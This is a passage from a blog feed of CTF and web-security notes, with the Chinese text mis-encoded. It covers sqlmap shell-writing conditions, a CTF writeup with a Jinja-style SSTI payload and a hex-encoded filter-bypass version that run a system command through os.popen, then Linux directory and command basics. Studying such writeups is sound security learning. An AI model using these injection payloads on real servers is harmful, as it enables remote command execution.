oufileå‘æœåŠ¡å™¨å†™å…¥ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªå¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¸€ä¸ªè¿›è¡Œä¸Šä¼ æ–‡ä»¶</p><h6 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h6><ul><li>è¦æ±‚ä¸ºæ•°æ®åº“DBAï¼Œä½¿ç”¨â€“is-dbaæŸ¥çœ‹å½“å‰ç½‘ç«™è¿æ¥çš„æ•°æ®åº“è´¦å·æ˜¯å¦ä¸ºmysql userè¡¨ä¸­çš„ç®¡ç†å‘˜å¦‚rootï¼Œæ˜¯åˆ™ä¸ºdba</li><li>secure_file_privæ²¡æœ‰å…·ä½“å€¼</li><li>çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</li></ul><h6 id="æµ‹è¯•-1"><a href="#æµ‹è¯•-1" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230509193030676-1024x210.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/513e42f930d1c33a6ddf76a9cd950a8c-1024x315.png"></p><h6 id="sql-shell"><a href="#sql-shell" class="headerlink" title="--sql-shell"></a>--sql-shell</h6><p>è¿™ä¸ªå¯ä»¥ç›´æ¥å…ˆä½¿ç”¨è¿™ä¸ªæ¥æ‰§è¡Œä¸€äº›sqlè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â sqlmap.py -u &quot;xxx&quot; --sql-shell</span><br><span class="line">&gt;&gt;&gt;select @@datadir; Â  Â &#x27;æŸ¥çœ‹æ–‡ä»¶è·¯å¾„ï¼ˆmysql/dataçš„è·¯å¾„ï¼Œæ ¹ç›®å½•ä¸€èˆ¬ä¸mysqlå¤„äºåŒä¸€ç›®å½•ï¼‰&#x27;</span><br><span class="line">&gt;&gt;&gt;select @@secure_file_priv Â  Â &#x27;æŸ¥çœ‹secure_file_privçš„å€¼æ˜¯å¦ä¸ºç©º&#x27; Â  Â  è¿”å›nullå°±ä¸è¡Œï¼Œå•¥ä¹Ÿä¸è¿”å›æ‰è¡Œ</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> webåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNSS 2022 æ‹›æ–°writeup(web)éƒ¨åˆ†é¢˜ç›®</title>
      <link href="/2023/05/14/CNSS-2022-%E6%8B%9B%E6%96%B0writeup-web-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
      <url>/2023/05/14/CNSS-2022-%E6%8B%9B%E6%96%B0writeup-web-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Hard-Walk-Through-My-Intranet-1"><a href="#Hard-Walk-Through-My-Intranet-1" class="headerlink" title="[Hard] Walk Through My Intranet - 1"></a>[Hard] Walk Through My Intranet - 1</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â pattern = re.compile(r&#x27;os\[]_self\+-\*class&quot;\.&#x27;, re.I  re.M)</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™çš„urlè¿‡æ»¤ä¿¡æ¯ï¼Œåˆ†ä¸ºå‡ ç±»bypass</p><p>os ï¼Œclass ï¼Œself ï¼Œ__ å¯ä»¥è¿›è¡Œç¼–ç ç»•è¿‡ <strong>class</strong>=&#x3D;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â \x+ASCIIå€¼ =ã€‹å¯¹åº”å€¼ï¼ˆåªè¦æ•°æ®è¢«å¼•å·åŒ…è£¹ï¼Œå°±èƒ½ä½œä¸ºå­—ç¬¦ä¸²ä¸€æ ·è¢«å¤„ç†ï¼Œbase64,asciiï¼Œå­—ç¬¦ä¸²å‡­å€Ÿï¼Œå€’ç½®ç­‰ï¼‰</span><br></pre></td></tr></table></figure><p>[ ] å’Œ . æ˜¯è¿›è¡Œè¿›å…¥ç›®å½•å­ç±»çš„ï¼Œç”¨ attr(â€˜ â€˜) ä¸€æ¬¡æ€§éƒ½è¿‡æ»¤æ‰</p><p>å…¶ä»–çš„éƒ½ç”¨ä¸ä¸Šï¼ŒåŸå§‹payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â &#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__()[&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;](300).__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æŠŠâ€™ â€˜é‡Œçš„æ•æ„Ÿä¸œè¥¿ç”¨ASCIIç¼–ç è¿‡æ»¤æ‰ã€‚[ ]å°±ç”¨attræ¢æ‰</p><p>æœ€åä¸€ä¸ªåŒå¼•å·é‡Œé¢å¥—å•å¼•å·å°±å¯ä»¥æ”¹æˆå¤–é¢å•å¼•å·é‡Œé¢åŒå¼•å·ï¼Œç„¶åé‡Œé¢åˆæ˜¯è¢«å½“åšå­—ç¬¦ä¸²çš„é‚£ç§ï¼Œå°±å¯ä»¥ASCIIç¼–ç äº†ã€‚</p><p>æœ€ç»ˆpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â &#123;&#123;&#x27;&#x27;attr(&#x27;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fmro\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(1)attr(&#x27;\x5f\x5fsub\x63\x6c\x61\x73\x73es\x5f\x5f&#x27;)()attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(300)attr(&#x27;\x5f\x5finit\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;eval&#x27;)(&#x27;\x5f\x5fimport\x5f\x5f(\x22\x6F\x73\x22)\x2epopen(\x22ls\x22)\x2eread()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>lsçš„åœ°æ–¹å°±æ˜¯èƒ½å¤Ÿè¾“å…¥å‘½ä»¤æœ‰æ¼æ´çš„åœ°æ–¹ã€‚</p><h3 id="linuxæ•æ„Ÿç›®å½•"><a href="#linuxæ•æ„Ÿç›®å½•" class="headerlink" title="linuxæ•æ„Ÿç›®å½•"></a>linuxæ•æ„Ÿç›®å½•</h3><p>è¿›å…¥linuxç›®å½•ä¹‹åå¼€å§‹å¯»æ‰¾æ•æ„Ÿç›®å½•ï¼š</p><p>è¿™äº›åˆæ˜¯åŸºäº<strong>FHS</strong>ï¼ˆFilesystem Hierarchy Standard ï¼‰æœºæ„</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1-1024x719.png" style="zoom:50%;" /><p><strong>FHSè®¤ä¸ºæ ¹ç›®å½•(&#x2F;)ä¸‹åº”è¯¥åŒ…å«å¦‚ä¸‹å­ç›®å½•</strong></p><p>ç›®å½•</p><p>åº”æ”¾ç½®æ¡£æ¡ˆå†…å®¹</p><p>&#x2F;bin</p><p>ç³»ç»Ÿæœ‰å¾ˆå¤šæ”¾ç½®æ‰§è¡Œæ¡£çš„ç›®å½•ï¼Œä½†&#x2F;binæ¯”è¾ƒç‰¹æ®Šã€‚å› ä¸º&#x2F;binæ”¾ç½®çš„æ˜¯åœ¨å•äººç»´æŠ¤æ¨¡å¼ä¸‹è¿˜èƒ½å¤Ÿè¢«æ“ä½œçš„<strong>æŒ‡ä»¤</strong>ã€‚åœ¨&#x2F;binåº•ä¸‹çš„æŒ‡ä»¤å¯ä»¥è¢«<strong>rootä¸ä¸€èˆ¬å¸å·æ‰€ä½¿ç”¨</strong>ï¼Œä¸»è¦æœ‰ï¼šcat,chmod(ä¿®æ”¹æƒé™), chown, date, mv, mkdir, cp, bashç­‰ç­‰å¸¸ç”¨çš„æŒ‡ä»¤ã€‚</p><p>&#x2F;boot</p><p>ä¸»è¦æ”¾ç½®å¼€æœºä¼šä½¿ç”¨åˆ°çš„æ¡£æ¡ˆï¼ŒåŒ…æ‹¬Linuxæ ¸å¿ƒæ¡£æ¡ˆä»¥åŠå¼€æœºé€‰å•ä¸å¼€æœºæ‰€éœ€è®¾å®šæ¡£ç­‰ç­‰ã€‚Linux kernelå¸¸ç”¨çš„æ¡£åä¸ºï¼švmlinuz ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯grubè¿™ä¸ªå¼€æœºç®¡ç†ç¨‹å¼ï¼Œåˆ™è¿˜ä¼šå­˜åœ¨&#x2F;boot&#x2F;grub&#x2F;è¿™ä¸ªç›®å½•ã€‚</p><p>&#x2F;dev</p><p>ï¼ˆdeviceï¼‰åœ¨Linuxç³»ç»Ÿä¸Šï¼Œä»»ä½•è£…ç½®ä¸å‘¨è¾¹è®¾å¤‡éƒ½æ˜¯ä»¥æ¡£æ¡ˆçš„å‹æ€å­˜åœ¨äºè¿™ä¸ªç›®å½•å½“ä¸­ã€‚ åªè¦é€šè¿‡å­˜å–è¿™ä¸ªç›®å½•ä¸‹çš„æŸä¸ªæ¡£æ¡ˆï¼Œå°±ç­‰äºå­˜å–æŸä¸ªè£…ç½®ã€‚æ¯”è¦é‡è¦çš„æ¡£æ¡ˆæœ‰&#x2F;dev&#x2F;null, &#x2F;dev&#x2F;zero, &#x2F;dev&#x2F;tty , &#x2F;dev&#x2F;lp_, &#x2F; dev&#x2F;hd_, &#x2F;dev&#x2F;sd*ç­‰ç­‰</p><p>&#x2F;etc</p><p>ç³»ç»Ÿä¸»è¦çš„<strong>è®¾å®šæ¡£</strong>å‡ ä¹éƒ½æ”¾ç½®åœ¨è¿™ä¸ªç›®å½•å†…ï¼Œä¾‹å¦‚<strong>äººå‘˜çš„å¸å·å¯†ç æ¡£ã€å„ç§æœåŠ¡çš„å¯å§‹æ¡£</strong>ç­‰ç­‰ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªç›®å½•ä¸‹çš„å„æ¡£æ¡ˆå±æ€§æ˜¯å¯ä»¥è®©ä¸€èˆ¬ä½¿ç”¨è€…æŸ¥é˜…çš„ï¼Œä½†æ˜¯åªæœ‰rootæœ‰æƒåŠ›ä¿®æ”¹ã€‚ FHSå»ºè®®ä¸è¦æ”¾ç½®å¯æ‰§è¡Œæ¡£(binary)åœ¨è¿™ä¸ªç›®å½•ä¸­ã€‚ æ¯”è¾ƒé‡è¦çš„æ¡£æ¡ˆæœ‰ï¼š&#x2F;etc&#x2F;inittab, &#x2F;etc&#x2F;init.d&#x2F;, &#x2F;etc&#x2F;modprobe.conf, &#x2F;etc&#x2F;X11&#x2F;, &#x2F;etc&#x2F;fstab, &#x2F;etc&#x2F;sysconfig&#x2F;ç­‰ç­‰ã€‚ å¦å¤–ï¼Œå…¶ä¸‹é‡è¦çš„ç›®å½•æœ‰ï¼š&#x2F;etc&#x2F;init.d&#x2F; ï¼šæ‰€æœ‰æœåŠ¡çš„é¢„è®¾å¯åŠ¨scriptéƒ½æ˜¯æ”¾åœ¨è¿™é‡Œçš„ï¼Œä¾‹å¦‚è¦å¯åŠ¨æˆ–è€…å…³é—­iptablesçš„è¯ï¼š &#x2F;etc&#x2F;init.d&#x2F;iptables startã€&#x2F;etc&#x2F;init.d&#x2F; iptables stop &#x2F;etc&#x2F;xinetd.d&#x2F; ï¼šè¿™å°±æ˜¯æ‰€è°“çš„super daemonç®¡ç†çš„å„é¡¹æœåŠ¡çš„è®¾å®šæ¡£ç›®å½•ã€‚ &#x2F;etc&#x2F;X11&#x2F; ï¼šä¸X Windowæœ‰å…³çš„å„ç§è®¾å®šæ¡£éƒ½åœ¨è¿™é‡Œï¼Œå°¤å…¶æ˜¯xorg.confæˆ–XF86Configè¿™ä¸¤ä¸ªX Serverçš„è®¾å®šæ¡£ã€‚ï¼ˆé…ç½®ä¿¡æ¯ï¼‰</p><p>&#x2F;home</p><p>è¿™æ˜¯ç³»ç»Ÿé¢„è®¾çš„ä½¿ç”¨è€…å®¶ç›®å½•(home directory)ã€‚ åœ¨ä½ <strong>æ–°å¢ä¸€ä¸ªä¸€èˆ¬ä½¿ç”¨è€…å¸å·æ—¶ï¼Œé¢„è®¾çš„ä½¿ç”¨è€…å®¶ç›®å½•éƒ½ä¼šè§„èŒƒ</strong>åˆ°è¿™é‡Œæ¥ã€‚æ¯”è¾ƒé‡è¦çš„æ˜¯ï¼Œå®¶ç›®å½•æœ‰ä¸¤ç§ä»£å·ï¼š <strong>~ ï¼šä»£è¡¨å½“å‰ä½¿ç”¨è€…çš„å®¶ç›®å½•ï¼Œè€Œ ~guestï¼šåˆ™ä»£è¡¨ç”¨æˆ·åä¸ºguestçš„å®¶ç›®å½•ã€‚</strong></p><p>&#x2F;lib</p><p>ç³»ç»Ÿçš„å‡½å¼åº“éå¸¸çš„å¤šï¼Œè€Œ&#x2F;libæ”¾ç½®çš„åˆ™æ˜¯åœ¨<strong>å¼€æœºæ—¶ä¼šç”¨åˆ°çš„å‡½å¼åº“</strong>ï¼Œä»¥åŠåœ¨&#x2F;binæˆ–&#x2F;sbinåº•ä¸‹çš„æŒ‡ä»¤ä¼šå‘¼å«çš„å‡½å¼åº“è€Œå·² ã€‚ ä»€ä¹ˆæ˜¯å‡½å¼åº“å‘¢ï¼Ÿå¦³å¯ä»¥å°†ä»–æƒ³æˆæ˜¯å¤–æŒ‚ï¼ŒæŸäº›æŒ‡ä»¤å¿…é¡»è¦æœ‰è¿™äº›å¤–æŒ‚æ‰èƒ½å¤Ÿé¡ºåˆ©å®Œæˆç¨‹å¼çš„æ‰§è¡Œä¹‹æ„ã€‚ å°¤å…¶é‡è¦çš„æ˜¯&#x2F;lib&#x2F;modules&#x2F;è¿™ä¸ªç›®å½•ï¼Œå› ä¸ºè¯¥ç›®å½•ä¼šæ”¾ç½®æ ¸å¿ƒç›¸å…³çš„æ¨¡ç»„(é©±åŠ¨ç¨‹å¼)ã€‚</p><p>&#x2F;media</p><p>mediaæ˜¯åª’ä½“çš„è‹±æ–‡ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™ä¸ª&#x2F;mediaåº•ä¸‹æ”¾ç½®çš„å°±æ˜¯<strong>å¯ç§»é™¤çš„è£…ç½®</strong>ã€‚ åŒ…æ‹¬è½¯ç¢Ÿã€å…‰ç¢Ÿã€DVDç­‰ç­‰è£…ç½®éƒ½æš‚æ—¶æŒ‚è½½äºæ­¤ã€‚ å¸¸è§çš„æ¡£åæœ‰ï¼š&#x2F;media&#x2F;floppy, &#x2F;media&#x2F;cdromç­‰ç­‰ã€‚</p><p>&#x2F;mnt</p><p>å¦‚æœå¦³æƒ³è¦<strong>æš‚æ—¶æŒ‚è½½æŸäº›é¢å¤–çš„è£…ç½®</strong>ï¼Œä¸€èˆ¬å»ºè®®å¦³å¯ä»¥æ”¾ç½®åˆ°è¿™ä¸ªç›®å½•ä¸­ã€‚åœ¨å¤æ—©æ—¶å€™ï¼Œè¿™ä¸ªç›®å½•çš„ç”¨é€”ä¸&#x2F;mediaç›¸åŒå•¦ã€‚ åªæ˜¯æœ‰äº†&#x2F;mediaä¹‹åï¼Œè¿™ä¸ªç›®å½•å°±ç”¨æ¥æš‚æ—¶æŒ‚è½½ç”¨äº†ã€‚</p><p>&#x2F;opt</p><p>è¿™ä¸ªæ˜¯ç»™<strong>ç¬¬ä¸‰æ–¹ååŠ›è½¯ä½“</strong>æ”¾ç½®çš„ç›®å½• ã€‚ ä»€ä¹ˆæ˜¯ç¬¬ä¸‰æ–¹ååŠ›è½¯ä½“å•Šï¼Ÿä¸¾ä¾‹æ¥è¯´ï¼ŒKDEè¿™ä¸ªæ¡Œé¢ç®¡ç†ç³»ç»Ÿæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è®¡ç”»ï¼Œä¸è¿‡ä»–å¯ä»¥å®‰è£…åˆ°Linuxç³»ç»Ÿä¸­ï¼Œå› æ­¤KDEçš„è½¯ä½“å°±å»ºè®®æ”¾ç½®åˆ°æ­¤ç›®å½•ä¸‹äº†ã€‚ å¦å¤–ï¼Œå¦‚æœå¦³æƒ³è¦è‡ªè¡Œå®‰è£…é¢å¤–çš„è½¯ä½“(éåŸæœ¬çš„distributionæä¾›çš„)ï¼Œé‚£ä¹ˆä¹Ÿèƒ½å¤Ÿå°†ä½ çš„è½¯ä½“å®‰è£…åˆ°è¿™é‡Œæ¥ã€‚ ä¸è¿‡ï¼Œä»¥å‰çš„Linuxç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä¹ æƒ¯æ”¾ç½®åœ¨&#x2F;usr&#x2F;localç›®å½•ä¸‹ã€‚</p><p>&#x2F;root</p><p>ç³»ç»Ÿç®¡ç†å‘˜(<strong>root)çš„å®¶ç›®å½•</strong>ã€‚ ä¹‹æ‰€ä»¥æ”¾åœ¨è¿™é‡Œï¼Œæ˜¯å› ä¸º<strong>å¦‚æœè¿›å…¥å•äººç»´æŠ¤æ¨¡å¼è€Œä»…æŒ‚è½½æ ¹ç›®å½•æ—¶ï¼Œè¯¥ç›®å½•å°±èƒ½å¤Ÿæ‹¥æœ‰rootçš„å®¶ç›®å½•</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šå¸Œæœ›rootçš„å®¶ç›®å½•ä¸æ ¹ç›®å½•æ”¾ç½®åœ¨åŒä¸€ä¸ªåˆ†åŒºä¸­ã€‚</p><p>&#x2F;sbin</p><p>Linuxæœ‰éå¸¸å¤šæŒ‡ä»¤æ˜¯ç”¨æ¥è®¾å®šç³»ç»Ÿç¯å¢ƒçš„ï¼Œè¿™äº›æŒ‡ä»¤åªæœ‰rootæ‰èƒ½å¤Ÿåˆ©ç”¨æ¥è®¾å®šç³»ç»Ÿï¼Œå…¶ä»–ä½¿ç”¨è€…æœ€å¤šåªèƒ½ç”¨æ¥æŸ¥è¯¢è€Œå·²ã€‚æ”¾åœ¨&#x2F;sbinåº•ä¸‹çš„ä¸ºå¼€æœºè¿‡ç¨‹ä¸­æ‰€éœ€è¦çš„ï¼Œé‡Œé¢åŒ…æ‹¬äº†å¼€æœºã€ä¿®å¤ã€è¿˜åŸç³»ç»Ÿæ‰€éœ€è¦çš„æŒ‡ä»¤ã€‚è‡³äºæŸäº›ä¼ºæœå™¨è½¯ä½“ç¨‹å¼ï¼Œä¸€èˆ¬åˆ™æ”¾ç½®åˆ°&#x2F;usr&#x2F;sbin&#x2F;å½“ä¸­ã€‚è‡³äºæœ¬æœºè‡ªè¡Œå®‰è£…çš„è½¯ä½“æ‰€äº§ç”Ÿçš„ç³»ç»Ÿæ‰§è¡Œæ¡£(system binary)ï¼Œåˆ™æ”¾ç½®åˆ°&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;å½“ä¸­äº†ã€‚å¸¸è§çš„æŒ‡ä»¤åŒ…æ‹¬ï¼šfdisk, fsck, ifconfig, init, mkfsç­‰ç­‰ã€‚</p><p>&#x2F;srv</p><p>srvå¯ä»¥è§†ä¸ºserviceçš„ç¼©å†™ï¼Œæ˜¯ä¸€äº›ç½‘è·¯æœåŠ¡å¯åŠ¨ä¹‹åï¼Œè¿™äº›æœåŠ¡æ‰€éœ€è¦å–ç”¨çš„<strong>èµ„æ–™ç›®å½•</strong>ã€‚ å¸¸è§çš„æœåŠ¡ä¾‹å¦‚WWW, FTPç­‰ç­‰ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼Œ<strong>WWWä¼ºæœå™¨éœ€è¦çš„ç½‘é¡µèµ„æ–™å°±å¯ä»¥æ”¾ç½®åœ¨&#x2F;srv&#x2F;www&#x2F;é‡Œé¢ã€‚å‘µå‘µï¼Œçœ‹æ¥å¹³æ—¶æˆ‘ä»¬ç¼–å†™çš„ä»£ç åº”è¯¥æ”¾åˆ°è¿™é‡Œäº†ã€‚</strong></p><p>&#x2F;tmp</p><p>è¿™æ˜¯è®©ä¸€èˆ¬ä½¿ç”¨è€…æˆ–è€…æ˜¯æ­£åœ¨æ‰§è¡Œçš„ç¨‹åº<strong>æš‚æ—¶æ”¾ç½®æ¡£æ¡ˆ</strong>çš„åœ°æ–¹ã€‚è¿™ä¸ªç›®å½•æ˜¯ä»»ä½•äººéƒ½èƒ½å¤Ÿå­˜å–çš„ï¼Œæ‰€ä»¥ä½ éœ€è¦å®šæœŸçš„æ¸…ç†ä¸€ä¸‹ã€‚å½“ç„¶ï¼Œé‡è¦èµ„æ–™ä¸å¯æ”¾ç½®åœ¨æ­¤ç›®å½•å•Šã€‚ å› ä¸ºFHSç”šè‡³å»ºè®®åœ¨å¼€æœºæ—¶ï¼Œåº”è¯¥è¦å°†&#x2F;tmpä¸‹çš„èµ„æ–™éƒ½åˆ é™¤ã€‚</p><p>è¿˜æœ‰ä¸‹é¢è¿™äº›</p><p>&#x2F;lost+found</p><p>è¿™ä¸ªç›®å½•æ˜¯ä½¿ç”¨æ ‡å‡†çš„ext2&#x2F;ext3æ¡£æ¡ˆç³»ç»Ÿæ ¼å¼æ‰ä¼šäº§ç”Ÿçš„ä¸€ä¸ªç›®å½•ï¼Œç›®çš„åœ¨äºå½“æ¡£æ¡ˆç³»ç»Ÿå‘ç”Ÿé”™è¯¯æ—¶ï¼Œå°†ä¸€äº›é—å¤±çš„ç‰‡æ®µæ”¾ç½®åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚ è¿™ä¸ªç›®å½•é€šå¸¸ä¼šåœ¨åˆ†å‰²æ§½çš„æœ€é¡¶å±‚å­˜åœ¨ï¼Œä¾‹å¦‚ä½ åŠ è£…ä¸€ä¸ªç¡¬ç›˜äº&#x2F;diskä¸­ï¼Œé‚£åœ¨è¿™ä¸ªç³»ç»Ÿä¸‹å°±ä¼šè‡ªåŠ¨äº§ç”Ÿä¸€ä¸ªè¿™æ ·çš„ç›®å½•&#x2F;disk&#x2F;lost+found</p><p>&#x2F;proc</p><p>è¿™ä¸ªç›®å½•æœ¬èº«æ˜¯ä¸€ä¸ª<strong>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</strong>(virtual filesystem)å–”ã€‚ ä»–æ”¾ç½®çš„èµ„æ–™éƒ½æ˜¯åœ¨å†…å­˜å½“ä¸­ï¼Œä¾‹å¦‚ç³»ç»Ÿæ ¸å¿ƒã€è¡Œç¨‹èµ„è®¯(process)ï¼ˆæ˜¯è¿›ç¨‹å—?ï¼‰ã€å‘¨è¾¹è£…ç½®çš„çŠ¶æ€åŠç½‘ç»œçŠ¶æ€ç­‰ç­‰ã€‚å› ä¸ºè¿™ä¸ªç›®å½•ä¸‹çš„èµ„æ–™éƒ½æ˜¯åœ¨è®°å¿†ä½“ï¼ˆå†…å­˜ï¼‰å½“ä¸­ï¼Œæ‰€ä»¥æœ¬èº«ä¸å ä»»ä½•ç¡¬ç›˜ç©ºé—´ã€‚æ¯”è¾ƒé‡è¦çš„æ¡£æ¡ˆï¼ˆç›®å½•ï¼‰ä¾‹å¦‚ï¼š &#x2F;proc&#x2F;cpuinfo, &#x2F;proc&#x2F;dma, &#x2F;proc&#x2F;interrupts, &#x2F;proc&#x2F;ioports, &#x2F;proc&#x2F;net&#x2F;*ç­‰ç­‰ã€‚å‘µå‘µï¼Œæ˜¯è™šæ‹Ÿå†…å­˜å—[guest]ï¼Ÿ</p><p>&#x2F;sys</p><p>è¿™ä¸ªç›®å½•å…¶å®è·Ÿ&#x2F;procéå¸¸ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ä¸ª<strong>è™šæ‹Ÿçš„æ¡£æ¡ˆç³»ç»Ÿ</strong>ï¼Œä¸»è¦ä¹Ÿæ˜¯è®°å½•ä¸<strong>æ ¸å¿ƒç›¸å…³çš„èµ„è®¯</strong>ã€‚ åŒ…æ‹¬ç›®å‰å·²è½½å…¥çš„æ ¸å¿ƒæ¨¡ç»„ä¸æ ¸å¿ƒä¾¦æµ‹åˆ°çš„ç¡¬ä½“è£…ç½®èµ„è®¯ç­‰ç­‰ã€‚ è¿™ä¸ªç›®å½•åŒæ ·ä¸å ç¡¬ç›˜å®¹é‡ã€‚</p><p>æ¨èåšå®¢</p><p><a href="https://www.cnblogs.com/silence-hust/p/4319415.html">https://www.cnblogs.com/silence-hust/p/4319415.html</a></p><h3 id="linuxå¸¸è§å‘½ä»¤"><a href="#linuxå¸¸è§å‘½ä»¤" class="headerlink" title="linuxå¸¸è§å‘½ä»¤"></a>linuxå¸¸è§å‘½ä»¤</h3><h5 id="æŸ¥çœ‹å½“å‰ç”¨æˆ·"><a href="#æŸ¥çœ‹å½“å‰ç”¨æˆ·" class="headerlink" title="æŸ¥çœ‹å½“å‰ç”¨æˆ·"></a>æŸ¥çœ‹å½“å‰ç”¨æˆ·</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â whoami</span><br></pre></td></tr></table></figure><h5 id="æŸ¥çœ‹ipç­‰ä¿¡æ¯"><a href="#æŸ¥çœ‹ipç­‰ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ipç­‰ä¿¡æ¯"></a>æŸ¥çœ‹ipç­‰ä¿¡æ¯</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â ifcinfig Â  Â  Â   //æŸ¥è¯¢å’Œé…ç½®ç½‘ç»œæ¥å£</span><br><span class="line">Â hostname -I  // æ˜¾ç¤ºä¸»æœºåip</span><br><span class="line">Â ip addr show  //æŸ¥çœ‹ipv4ï¼Œipv6åœ°å€</span><br></pre></td></tr></table></figure><h5 id="æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„"><a href="#æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„" class="headerlink" title="æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„"></a>æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â   pwd Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  //æ˜¾ç¤ºå½“å‰ä½ç½®è·¯å¾„</span><br></pre></td></tr></table></figure><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Â find . -name &quot;*.c&quot; Â  Â  //å°†ç›®å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰å»¶ä¼¸æ¡£åæ˜¯ c çš„æ–‡ä»¶åˆ—å‡ºæ¥</span><br><span class="line">Â find . -type f Â  Â  Â  Â  //å°†ç›®å‰ç›®å½•å…¶å…¶ä¸‹å­ç›®å½•ä¸­æ‰€æœ‰ä¸€èˆ¬æ–‡ä»¶åˆ—å‡º</span><br><span class="line">Â find . -ctime -20 Â  Â   //å°†ç›®å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æœ€è¿‘ 20 å¤©å†…æ›´æ–°è¿‡çš„æ–‡ä»¶åˆ—å‡º</span><br><span class="line">Â find /var/log -type f -mtime +7 -ok rm &#123;&#125; \; Â  Â  //æŸ¥æ‰¾/var/logç›®å½•ä¸­æ›´æ”¹æ—¶é—´åœ¨7æ—¥ä»¥å‰çš„æ™®é€šæ–‡ä»¶ï¼Œå¹¶åœ¨åˆ é™¤ä¹‹å‰è¯¢é—®å®ƒä»¬</span><br><span class="line">Â find . -type f -perm 644 -exec ls -l &#123;&#125; \; Â  Â  Â  //æŸ¥æ‰¾å‰ç›®å½•ä¸­æ–‡ä»¶å±ä¸»å…·æœ‰è¯»ã€å†™æƒé™ï¼Œå¹¶ä¸”æ–‡ä»¶æ‰€å±ç»„çš„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·å…·æœ‰è¯»æƒé™çš„æ–‡ä»¶</span><br><span class="line">Â find / -type f -size 0 -exec ls -l &#123;&#125; \; Â  Â  Â  Â  //ä¸ºäº†æŸ¥æ‰¾ç³»ç»Ÿä¸­æ‰€æœ‰æ–‡ä»¶é•¿åº¦ä¸º0çš„æ™®é€šæ–‡ä»¶ï¼Œå¹¶åˆ—å‡ºå®ƒä»¬çš„å®Œæ•´è·¯å¾„</span><br></pre></td></tr></table></figure><h5 id="ç³»ç»Ÿä¿¡æ¯ï¼ˆ-ï¼‰"><a 